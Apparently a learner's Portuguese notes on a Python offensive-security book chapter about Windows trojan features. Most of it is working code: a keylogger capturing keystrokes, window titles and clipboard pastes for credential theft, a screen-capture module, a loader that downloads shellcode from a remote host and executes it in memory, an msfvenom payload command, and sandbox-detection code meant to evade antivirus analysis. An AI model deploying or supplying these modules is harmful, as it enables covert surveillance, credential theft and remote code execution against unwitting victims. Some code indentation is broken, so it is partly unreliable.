# Capitulo 8 

Nesse capítulo são abordadas tarefas comuns de se realizar em um sistema Windows.

## Tarefas comuns de trojans no Windows

Vamos explorar alguns métodos de captura de informações de alvos neste capítulo, direcionados ao Windows. Exemplos comuns são:

- Keylogging: identificação de pressionamento de teclas no teclado
- Screenshots: capturas de tela em momentos específicos pelo usuário
- Shellcode: execução de comandos shell no computador da vítima

É importante que, para realizar os testes, o alvo seja bem modelado para evitar erros em alvos reais.

### Keylogging para captura de pressionamento de teclas

Você pode ler mais sobre keylogging a partir da [internet](https://pt.wikipedia.org/wiki/Keylogger), mas basicamente é o que foi escrito anteriormente: um método de captura de inputs do teclado que é muito útil para captura de credenciais e de conversas.

Os autores mencionam a existência de uma biblioteca chamada [PyWinHook](https://pypi.org/project/pyWinhook/), que é uma adaptação da biblioteca [PyHook](https://pypi.org/project/pyHook/) para o Python 3. Ela utiliza uma função do Windows chamada `SetWindowsHookEx`, que permite a utilização de funções arbitrárias em determinados eventos do Windows. Finalmente, a lib também permite sabermos qual processo está executando as teclas, o que ajuda a desvendar o software em que são usadas as senhas/credenciais eventualmente digitadas.

Para instalar a lib:

```bash
pip install swig
pip install pywinhook
```

Caso não dê certo instalar, experimente:

1. Desligar e ligar a máquina
2. Rodar no VENV a instalação e em seguida rodar no terminal normal

Falando sobre os *Hooks*, eles são nada mais que técnicas de modificação de um determinado sistema operacional/software pela interceptação de chamadas de função/mensagens/eventos entre os componentes de software.

Deixemos que o PyWinHook cuide do baixo nível para nós. Criaremos o arquivo `keylogger.py`:

```py
# Vamos lá, isso vai ser complicadinho para que não manja de Windows
# Lembra da ctypes? Usamos ela para converter os valores de variáveis em Python para C/C++
# Nesse caso, usaremos algumas funções do C/C++ para se comunicar com os dados do Windows
# byref é uma referencia a um ponteiro Windows (usada para apontar processos) para que o ponteiro seja modificado durante a chamada
# create_string_buffer cria um buffer de memória para armazenar string, serve para receber dados
# c_ulong é a variável em C para unsigned long
# windll é o módulo de inferface com as dlls do Windows. Serve para chamar funções nativas, por exemplo,
# user32 ou kernel32, que chama funções ao nível de usuário e ao nível de OS
from ctypes import byref, create_string_buffer, c_ulong, windll 
from io import StringIO # uso de strings input/output

import os
 # O pythoncom é um módulo do pacote pywin32 que fornece funcionalidades para interagir com o COM 
 # (Component Object Model) no Windows. O COM é uma tecnologia da Microsoft que permite a criação 
 # de componentes reutilizáveis e a comunicação entre aplicações ou bibliotecas de forma 
 # independente de linguagem.
import pythoncom    
import pyWinhook as pyHook # hoks
import sys
import time
# O win32clipboard é um módulo do pacote pywin32 que permite interagir com a área de transferência 
# do Windows (clipboard). Ele fornece funcionalidades para copiar, colar e manipular dados 
# diretamente no clipboard, incluindo texto, imagens e outros formatos suportados pelo sistema.
import win32clipboard

TIMEOUT = 60*10

# Classe do Keylogger
class Keylogger:
    def __init__(self):
        self.current_window = None  # nome da janela atual, usada para saber onde os inputs de teclado vão
        
    def get_current_process(self):
    # Obtém o identificador da janela atualmente em foco no sistema.
    hwnd = windll.user32.GetForegroundWindow()  
    
    # Cria uma variável para armazenar o ID do processo (PID) associado à janela em foco.
    pid = c_ulong(0)
    # Preenche o PID do processo associado à janela ativa usando o identificador `hwnd`.
    windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
    # Converte o valor do PID para uma string para facilitar o uso posterior.
    process_id = f'{pid.value}'
    
    # Cria um buffer para armazenar o nome do executável associado ao processo.
    executable = create_string_buffer(512)
    # Abre o processo associado ao PID para obter informações adicionais sobre ele.
    # O acesso especificado (0x400 | 0x10) permite ler informações básicas sobre o processo.
    h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
    
    # Obtém o nome do executável associado ao processo usando a API do Windows.
    windll.psapi.GetModuleBaseNameA(
                h_process, None, byref(executable), 512)
    
    # Cria um buffer para armazenar o título da janela atualmente em foco.
    window_title = create_string_buffer(512)
    # Obtém o título da janela associada ao identificador `hwnd`.
    windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
    
    try:
        # Tenta decodificar o título da janela para armazená-lo em `self.current_window`.
        # Isso pode falhar se o título contiver caracteres que não podem ser decodificados.
        self.current_window = window_title.value.decode()
    except UnicodeDecodeError as e:
        # Em caso de erro de decodificação, exibe uma mensagem e define o título como desconhecido.
        print(f'{e}: nome da janela desconhecido')
        
    # Imprime as informações coletadas: PID, nome do executável e título da janela.
    print('\n', process_id, executable.value.decode(), self.current_window)
    
    # Fecha os identificadores abertos para a janela (`hwnd`) e o processo (`h_process`)
    # para liberar recursos do sistema.
    windll.kernel32.CloseHandle(hwnd)
    windll.kernel32.CloseHandle(h_process)
```

Ufa! Meio complicadinho, mas vamos seguindo...

O código acima serve somente para saber qual a janela ativa no momento. Agora implementaremos, de fato, o keylogger:

```py
    # mykeystroke na verdade recebe os eventos de input do teclado
    def mykeystroke(self, event): 
            if event.WindowName != self.current_window: # se, na classe atual do Keylogger,
                                                        # a dada janela dele não for atual, atualiza a janela
                self.get_current_process()
            if 32 < event.Ascii < 127:
                print(chr(event.Ascii), end='')         # se os caracteres do evento forem uma sequencia de ASCII, printa eles
            else:
                if event.Key == 'V':                    # Sempre que houver uma tecla "V" maiuscula (podendo ser Ctrl-V), usa o clipboard
                    win32clipboard.OpenClipboard()      # para capturar o que está salvo lá
                    value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    print(f'[PASTE] = {value}')         # printa o que foi colado
                    
                else:   
                    print(f'\n{event.Key}')               # se não for ascii, printa a tecla normalmente
                    
            return True
        
def run():
    save_stdout = sys.stdout    # salva o buffer a ser printado
    sys.stdout = StringIO()     # cria com StringIO um buffer para ser usado para output. Essa lib também é usada para simular um arquivo
    kl = Keylogger()            # inicia o keylogger
    hm = pyHook.HookManager()   # inicia o manager dos Hooks que interpretará os eventos de teclado
    hm.KeyDown = kl.mykeystroke # coloca para que todo hook de pressionamento de tecla seja usado como evento no mykeystroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages() # pythoncom.PumpWaitingMessages() vem da lib do Windows e serve para aguardar uma fila de eventos
                                        # mais ou menos como uma forma de sempre ler todos os eventos, processando os eventos pendentes em ordem.
    log = sys.stdout.getvalue()         # pega o buffer de stdout
    sys.stdout = save_stdout            # salva-o antes do próximo run
    return log

if __name__ == '__main__':
    print(run())
    print('Concluido')
```

Pronto! Agora você tem um código de keylogger funcional!

### Explorando o código

Bom, agora você tem o keylogger. Você pode acioná-lo aos módulos do trojan do Capítulo 7 e pode mudar o TIMEOUT para que ele execute em determinado tempo.

### Capturando screenshots

Para adicionarmos essa fucnionalidade ao nosso eventual trojan, utilizaremos a lib `pywin32`. Instale-a através de:

```bash
pip install pywin32
```

Para capturarmos as telas do usuário usaremos a Interface de Dispositivos Gráficos do Windows (GDI, na sigla em inglês). Em `screenshotter.py`:

```py
import base64  # Biblioteca para codificar e decodificar dados em base64.
import win32api  # Biblioteca para interagir com a API do Windows (funções de sistema).
import win32con  # Biblioteca com constantes utilizadas pela API do Windows.
import win32gui  # Biblioteca para manipular janelas no ambiente Windows.
import win32ui  # Biblioteca para manipular objetos gráficos no Windows.

def get_dimensions():
    # Obtém as dimensões totais da tela virtual (incluindo múltiplos monitores).
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)  # Largura da tela virtual.
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)  # Altura da tela virtual.
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)  # Coordenada esquerda da tela virtual.
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)  # Coordenada superior da tela virtual.
    
    return (width, height, left, top)  # Retorna as dimensões em forma de tupla.

def screenshot(name='screenshot'):
    # Captura uma captura de tela (screenshot) e salva como um arquivo BMP.
    hdesktop = win32gui.GetDesktopWindow()  # Obtém o identificador da janela da área de trabalho.
    width, height, left, top = get_dimensions()  # Obtém as dimensões da tela.

    # Obtém o contexto de dispositivo da área de trabalho.
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)  # Cria um contexto de dispositivo a partir do handle.
    mem_dc = img_dc.CreateCompatibleDC()  # Cria um contexto de dispositivo compatível (para operações gráficas).

    # Cria um bitmap compatível com as dimensões da tela.
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)  # Configura o bitmap com a largura e altura da tela.
    mem_dc.SelectObject(screenshot)  # Associa o bitmap ao contexto de memória.

    # Copia o conteúdo da tela para o bitmap usando BitBlt.
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    
    # Salva o bitmap como um arquivo BMP.
    screenshot.SaveBitmapFile(mem_dc, f'{name}.bmp')

    # Libera recursos: contexto de memória e o bitmap.
    mem_dc.DeleteDC()  # Remove o contexto de memória.
    win32gui.DeleteObject(screenshot.GetHandle())  # Libera o recurso do bitmap na memória.

def decode_and_save_image(base64_data, output_filename='decoded_image.bmp'):
    # Decodifica uma string base64 para bytes binários e salva como um arquivo de imagem.
    binary_data = base64.b64decode(base64_data)  # Decodifica os dados base64 para binário.
    with open(output_filename, 'wb') as f:  # Abre o arquivo de saída no modo binário de escrita.
        f.write(binary_data)  # Escreve os bytes decodificados no arquivo.

def run():
    # Função principal para capturar a tela, codificar em base64 e retornar a string base64.
    screenshot()  # Captura a tela e salva como 'screenshot.bmp'.
    with open('screenshot.bmp', 'rb') as f:  # Abre o arquivo BMP gerado no modo binário de leitura.
        img = base64.b64encode(f.read())  # Codifica os dados do arquivo em base64.
    return img  # Retorna a string base64.

if __name__ == '__main__':
    # Execução principal do script.
    # Captura a tela, codifica em base64 e decodifica para salvar em outro arquivo.
    decode_and_save_image(run())  # Chama 'run' para gerar a imagem e depois decodifica e salva como 'decoded_image.bmp'.
```

Um `bitmap` (mapa de bits) é uma representação digital de uma imagem composta por uma grade de pixels, onde cada pixel é armazenado como um ou mais bits que determinam sua cor. No contexto gráfico do Windows, um bitmap é usado para armazenar imagens no formato bruto, diretamente mapeadas em memória. Esse formato é amplamente utilizado por ser simples e eficiente para manipulações gráficas como capturas de tela ou renderizações rápidas. Em um bitmap padrão, os pixels são armazenados sequencialmente, linha por linha, com informações adicionais como largura, altura e profundidade de cor incluídas no cabeçalho do arquivo. O formato BMP (Bitmap File) é a implementação mais conhecida de bitmaps no Windows.

O `DC` (Device Context) é uma estrutura que define um contexto gráfico associado a um dispositivo de saída, como a tela ou uma impressora. Ele serve como um intermediário entre a aplicação e o dispositivo gráfico, permitindo que comandos gráficos (como desenhar, copiar ou modificar imagens) sejam executados. No caso do Windows, funções como `GetWindowDC` ou `CreateCompatibleDC` retornam DCs que permitem interagir com a tela, janelas, ou outros objetos gráficos. O DC contém informações essenciais, como resolução, cores disponíveis e o buffer de memória associado, facilitando operações como capturas de tela, onde os dados gráficos de um dispositivo são copiados para outro (por exemplo, de um monitor para um bitmap em memória).


### Executando o shellcode de forma Pythonica

Agora que temos uma forma de tirar screenshots e de ler o teclado, vamos analisar formas de executar `shellcode` na máquina-alvo. Isso é útil para testar eventuais novos exploits que podem surgir.

Para fazer isso sem ter acesso ao sistema de arquivos, vamos usar um buffer de memória para armazenar o `shellcode` e, utilizando o `ctypes`, criaremos um ponteiro de função para essa memória. Em seguida, finalmente, chamaremos a função.

Em `shell_exec.py`:

```py
# Importa o módulo request da biblioteca urllib para fazer requisições HTTP.
from urllib import request

# Importa os módulos binascii, base64 e ctypes. 
# binascii e base64 são usados para manipular dados binários e codificação base64.
# ctypes é usado para chamar funções de bibliotecas de C, neste caso, funções do Windows API.
import binascii
import base64
import ctypes

# A variável kernel32 acessa a biblioteca kernel32.dll, que contém várias funções do sistema Windows.
kernel32 = ctypes.windll.kernel32

# Função get_code que faz uma requisição HTTP para a URL fornecida, lê os dados e os decodifica de base64 para bytes.
# A função retorna o shellcode em bytes.
def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

# Função write_memory que aloca memória e escreve o shellcode nela.
# Define o tipo de retorno de VirtualAlloc como um ponteiro void (ctypes.c_void_p).
# Define os tipos de argumento para RtlMoveMemory: ponteiro void, ponteiro void e tamanho.
# Aloca memória usando VirtualAlloc com permissões de execução e escrita.
# Copia o shellcode para a memória alocada usando RtlMoveMemory.
# Retorna o ponteiro para a memória alocada.
def write_memory(buf):
    length = len(buf)
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )
    
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

# Função run que executa o shellcode.
# Cria um buffer de string com o shellcode.
# Chama a função write_memory para alocar memória e copiar o shellcode.
# Converte o ponteiro para uma função em C (nenhum argumento e nenhum retorno).
# Executa a função shellcode.
def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)
    
    ptr = write_memory(buffer)
    
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

# Bloco principal que será executado se o script for executado diretamente.
# Define a URL para baixar o shellcode.
# Chama a função get_code para obter e decodificar o shellcode.
# Chama a função run para executar o shellcode.
if __name__ == '__main__':
    
    url = "http://192.168.100.77:8100/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
```

Você pode gerar shellcode arbitrariamente, neste repositório tem um exemplo de shellcode básico feito pelo ChatGPT, em `new_shellcode.py`


### Explorando o código

Você, caso queira, pode fazer o python criar um servidor HTTP simples no seu diretório atual através de:

```bash
python -m http.server 8100
```

A partir dele e, com um arquivo binário (`.bin`) no seu diretório, você pode substituir a URL pelo seu localhost e tentar executar o shell. Contudo não conseguir realizar isso pois recebi bloqueios do meu OS e do meu antivírus, que levavam à destruição do arquivo executado. Acho que em um sistema menos protegido deve funcionar.

Vale ressaltar que o Metasploit e outros frameworks de exploits tem funcionadidades de criação de shellcode usando exploits conhecidos. Os autores dão o seguinte exemplo no livro:

```bash
$ msfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f rawcmd=calc.exe > shellcode.raw
$ base64 -w 0 -i shellcode.raw > shellcode.bin
```

E puxam o `shellcode.bin` para o dispositivo para executá-lo. 

Pode ser que em algum momento eu vá testar esse código em uma máquina vulnerável, mas não foi dessa vez. Entrará para os não-testados.

### Detecção de sandbox

Imagina que o seu trojan é bem sucedido e, em algum momento, ele é pego para análise de uma equipe de antivírus. Logo é importante identificarmos quando nossos passos seriam rastreados para que possamos impedir a leitura ou execução de trechos importantes do nosso código, que comprometam nossa anonimicidade:

```
Um sandbox (ou "caixa de areia", em português) é um ambiente isolado que é usado para executar, testar ou analisar programas, código ou processos sem que eles interfiram no sistema principal ou causem danos ao ambiente externo. Ele funciona como uma camada de proteção, limitando o acesso do programa às partes sensíveis do sistema e evitando que ações maliciosas ou falhas afetem outros recursos.
```

Algumas técnicas podem ser utilizadas para a identificação do contexto de sandbox, como os inputs recentes do usuário, pressionamento de teclas, cliques e duplos cliques, etc. Isso nos ajuda na identificação pois, geralmente, sandboxes usam métodos automatizados de cliques para realizar suas atividades. 

Adicionaremos ao nosso identificador:

1. Monitoramento dos inputs recentes do usuário
2. Uma inteligência básica para pressionamento de teclas
3. Identificador de inputs repetitivos ou rápidos
4. Identificador de intervalos de utilização da máquina pelo usuário

Em `sandbox_detector.py`:

```py
from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
# Importa funções e tipos de dados da biblioteca `ctypes`, que permite chamadas de funções e manipulação de tipos em bibliotecas C.
# - `byref`: Passa uma referência de um objeto como ponteiro para uma função C.
# - `c_uint`, `c_ulong`: Define tipos equivalentes aos tipos C `unsigned int` e `unsigned long`.
# - `sizeof`: Retorna o tamanho de uma estrutura ou tipo de dado em bytes.
# - `Structure`: Base para criar estruturas de dados compatíveis com C.
# - `windll`: Fornece acesso às funções de bibliotecas DLL padrão do Windows.

import random
import sys
import time
import win32api
# Importa módulos auxiliares para geração de números aleatórios (`random`), interação com o sistema (`sys`), controle de tempo (`time`),
# e API do Windows para funções adicionais (`win32api`).

class LASTINPUTINFO(Structure):
    # Define uma estrutura compatível com C chamada `LASTINPUTINFO` que será usada para armazenar informações do último evento de entrada.
    _fields_ = [
        ('cbSize', c_uint),  # `cbSize`: Tamanho da estrutura, usado pelo sistema para validação.
        ('dwTime', c_ulong)  # `dwTime`: O momento (em milissegundos) do último evento de entrada.
    ]

def get_last_input():
    # Função que calcula o tempo (em milissegundos) desde o último evento de entrada do usuário.

    struct_lastinputinfo = LASTINPUTINFO()
    # Cria uma instância da estrutura `LASTINPUTINFO`.

    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
    # Define o tamanho da estrutura (requisito obrigatório para a função do Windows `GetLastInputInfo`).

    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
    # Chama a função `GetLastInputInfo` da DLL `user32` para preencher a estrutura com informações
    # do último evento de entrada (teclado ou mouse). O parâmetro `byref(struct_lastinputinfo)` passa
    # uma referência à estrutura para ser preenchida.

    run_time = windll.kernel32.GetTickCount()
    # Obtém o tempo total de execução do sistema desde que foi iniciado, em milissegundos.
    # Usado para calcular o tempo decorrido desde o último evento de entrada.

    elapsed = run_time - struct_lastinputinfo.dwTime
    # Calcula o tempo decorrido desde o último evento de entrada do usuário.

    print(f"[*] Passaram {elapsed} milissegundos desde o último evento")
    # Exibe no console o tempo decorrido em milissegundos.

    return elapsed
    # Retorna o tempo decorrido desde o último evento de entrada.

while True:
    # Inicia um loop infinito.

    get_last_input()
    # Chama a função `get_last_input()` para calcular e exibir o tempo desde o último evento de entrada.

    time.sleep(1)
    # Aguarda 1 segundo antes de repetir o loop.
```

No livro, trecho discute como o tempo total de execução do sistema e o último evento de entrada do usuário podem variar dependendo de como o código foi implantado. Se o método de infecção envolveu um clique ou outra ação do usuário (como no caso de phishing), pode ser esperado que o último evento de entrada tenha ocorrido recentemente. 

No entanto, se o sistema estiver rodando por um tempo considerável sem eventos de entrada, é possível que o código esteja sendo executado em um ambiente isolado, como uma sandbox. Essas variações devem ser levadas em consideração ao criar um trojan eficaz. 

Além disso, a técnica pode ser usada para monitorar a inatividade do usuário, realizar capturas de tela quando o usuário estiver ativo, ou realizar tarefas apenas quando o usuário estiver offline. Também é possível monitorar a atividade do usuário ao longo do tempo para identificar os dias e horários em que ele está normalmente online.

Agora, vamos estabelecer 3 limites para a detecção de quantos desses valores de input são necessários para identificar se estamos em um ambiente sandbox.

Excluiremos o último loop do código e colocaremos a lógica de detecção de teclas e de cliques do mouse. Ao invés de usar o `PyWinHook`, agora utilizaremos uma solução pura em `ctypes`:

```py
class Detector:
    # O método __init__ é o construtor da classe.
    # Ele inicializa três variáveis para armazenar o número de cliques do mouse, pressionamentos de teclas e cliques duplos.
    def __init__(self):
        self.double_clicks = 0   # Contador de cliques duplos do mouse
        self.keystrokes = 0       # Contador de pressionamentos de teclas
        self.mouse_clicks = 0     # Contador de cliques do mouse
        # Veja que esses são os nossos 3 indicadores de sandbox

    # A função get_key_press monitora o teclado e os cliques do mouse
    def get_key_press(self):
        # O laço for percorre todas as possíveis teclas (0 até 255)
        for i in range(0, 0xff):
            # Obtém o estado atual da tecla usando win32api.GetAsyncKeyState.
            # Essa função retorna o estado da tecla no momento em que a função é chamada.
            state = win32api.GetAsyncKeyState(i)
            
            # O valor retornado por GetAsyncKeyState é uma combinação de bits, onde:
            # - O bit 0 indica se a tecla foi pressionada (1) ou não (0).
            # - O bit 15 indica se a tecla está sendo pressionada de forma contínua (1) ou não (0).
            
            # O operador & é utilizado para testar se o bit 0 está ativo, ou seja, se a tecla foi pressionada.
            if state & 0x0001:  # 0x0001 é o bit que indica que a tecla foi pressionada

                # Se a tecla for a tecla do mouse (botão esquerdo, código 0x1),
                # incrementa o contador de cliques do mouse.
                if i == 0x1:
                    self.mouse_clicks += 1  # Incrementa o contador de cliques do mouse
                    return time.time()  # Retorna o horário atual, representando o tempo do clique

                # Se o código da tecla for entre 32 e 127, trata-se de uma tecla imprimível (alfabeto, números, etc.)
                # Esses códigos estão dentro do intervalo de teclas ASCII.
                elif i > 32 and i < 127:
                    self.keystrokes += 1  # Incrementa o contador de pressionamentos de teclas
                    
        return None  # Retorna None se não houver nenhuma tecla pressionada ou clique registrado.
```

Esse código é uma abstração ao Keylogger, pois ele realiza apenas uma deteção do estado da tecla ao longo da execução do programa. Como é humanamente impossível clicar numa tecla mais rápido do que o Python consegue percorrer o estado das 256 teclas possíveis, esse código funciona bem como um identificador de pressionamento. 

Agora, implementaremos um método que combinará os trechos já vistos:

```py
def detect(self):
    # Variáveis de controle e configuração para o processo de detecção
    previous_timestamp = None  # Armazena o timestamp (tempo) do último pressionamento de tecla
    first_double_click = None  # Armazena o tempo do primeiro clique duplo
    double_click_threshold = 0.35  # Limite de tempo em segundos entre cliques para ser considerado um clique duplo
    
    max_double_clicks = 10  # Número máximo de cliques duplos permitidos
    max_keystrokes = random.randint(10, 25)  # Número máximo de pressionamentos de tecla aleatório (entre 10 e 25)
    max_mouse_clicks = random.randint(5, 25)  # Número máximo de cliques do mouse aleatório (entre 5 e 25)
    max_input_threshold = 30000  # Limite máximo de tempo de inatividade (em milissegundos) antes de encerrar
    
    # Obtém o tempo do último input (presumivelmente, a função 'get_last_input' verifica a inatividade do sistema)
    last_input = get_last_input()
    
    # Se o último input foi há mais tempo que o limiar de inatividade, encerra o programa
    if last_input >= max_input_threshold:
        sys.exit(0)
        
    detection_complete = False  # Flag para controlar quando a detecção termina
    while not detection_complete:  # O loop continua até que a detecção seja concluída
        
        # Chama a função 'get_key_press' para obter o tempo do pressionamento de uma tecla
        keypress_time = self.get_key_press()
        
        # Verifica se houve um pressionamento de tecla e se o timestamp anterior é válido
        if keypress_time is not None and previous_timestamp is not None:
            elapsed = keypress_time - previous_timestamp  # Tempo passado desde o último pressionamento de tecla
            
            # Verifica se o tempo entre os pressionamentos é inferior ao limite para detectar um clique duplo
            if elapsed <= double_click_threshold:
                self.mouse_clicks -= 2  # Subtrai dois cliques de mouse para contabilizar o clique duplo
                self.double_clicks += 1  # Incrementa o número de cliques duplos

                # Se for o primeiro clique duplo, registra o tempo dele
                if first_double_click is None:
                    first_double_click = time.time()
                else:
                    # Verifica se o número máximo de cliques duplos foi atingido
                    if self.double_clicks >= max_double_clicks:
                        # Verifica se o tempo entre os cliques duplos é adequado para o limite
                        if (keypress_time - first_double_click <= 
                            (max_double_clicks * double_click_threshold)):
                            sys.exit(0)  # Se o limite for atingido, encerra o programa
                
            # Verifica se o número máximo de pressionamentos de tecla, cliques duplos e cliques de mouse foi atingido
            if (self.keystrokes >= max_keystrokes and
                self.double_clicks >= max_double_clicks and
                self.mouse_clicks >= max_mouse_clicks):
                detection_complete = True  # Completa a detecção se os critérios forem atendidos
        
            previous_timestamp = keypress_time  # Atualiza o timestamp para o próximo ciclo
            
        # Se não houver cliques e o pressionamento de tecla for detectado, atualiza o timestamp
        elif keypress_time is not None:
            previous_timestamp = keypress_time  # Atualiza o timestamp para o próximo ciclo

if __name__ == '__main__':
    d = Detector()  # Cria uma instância da classe Detector
    d.detect()  # Executa a função de detecção
    print('okay.')  # Imprime 'okay.' após a execução da detecção
```

O código monitora as interações do usuário com o teclado e o mouse, verificando se o número de pressionamentos de teclas, cliques duplos e cliques do mouse atinge os limites definidos. 

Quando um clique duplo ocorre dentro de um intervalo de tempo específico (definido pela constante double_click_threshold), ele é contabilizado. 

Se o número total de cliques duplos, pressionamentos de tecla e cliques de mouse atinge os valores máximos definidos, a detecção é considerada concluída e o programa continua normalmente. Caso contrário, o loop de detecção continua.

Além disso, o código verifica o tempo de inatividade do sistema utilizando a função get_last_input(). Se o tempo de inatividade for maior que o limite estabelecido (max_input_threshold), o programa é encerrado automaticamente. 

A detecção também leva em consideração a sequência e o tempo entre os eventos, e se o número máximo de cliques duplos em um curto período for atingido, o programa também será encerrado. 

O processo continua até que os critérios de detecção sejam atendidos ou a inatividade ultrapasse o limite.

Pronto. Agora temos alguns módulos bem úteis que podem ser adicionados ao nosso trojan feito no capítulo 7. Os autores incentivam a realização de testes e alterações de computadores, já que diversas configurações feitas podem ser alteradas.